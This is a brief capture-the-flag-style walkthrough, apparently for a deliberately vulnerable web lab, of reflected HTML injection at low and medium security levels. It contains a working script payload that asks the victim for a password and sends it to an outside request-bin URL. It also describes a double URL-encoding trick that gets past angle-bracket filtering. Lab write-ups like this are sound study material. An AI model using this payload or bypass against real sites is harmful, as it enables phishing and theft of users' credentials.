///LVL: Low///
-------------
HTML Injection - Reflected (GET)

on this lvl, when trying to write some tags inside the forms "First name" / "Last name", it seems nothing
is SANITIZE or replace the user inputs. Let's try inject the following code: "<h1>Adkali</h1>"

We can se that nothing seems to stop us from injection a malicious code inside the form.
We can even edit the parameters on the top (GET), and sent it to the victim with a better code.
Let's try to inject for learning purpose the next code:

"<script>var password = prompt("Please enter your password again"); fetch("https://enca62lbf3jls.x.pipedream.net/"+password); alert("Accepted, Enjoy.");</script>"

As you can see, a prompt jumped asking for password, after user insert it, it thanks him.
what he doesnt know that the password was already sent to the attacker that waited for him to made this mistake.

///LVL: Medium///
----------------

On this lvl, it seems the site filters "<" and ">" while using them.
when trying inject some tag using script, it results in nothing.

"<script>alert("Adkali");</script>"

Using BurpSuite Decoder.Encoder, we can select some smart encode fucntions.
when selecting to encode the java code into URL, it reflected back to the source as the malicious code.
Nothing stop us from injectin it even on the parameters, and sent it to the victim.

**Note: use Encode Twice for this**
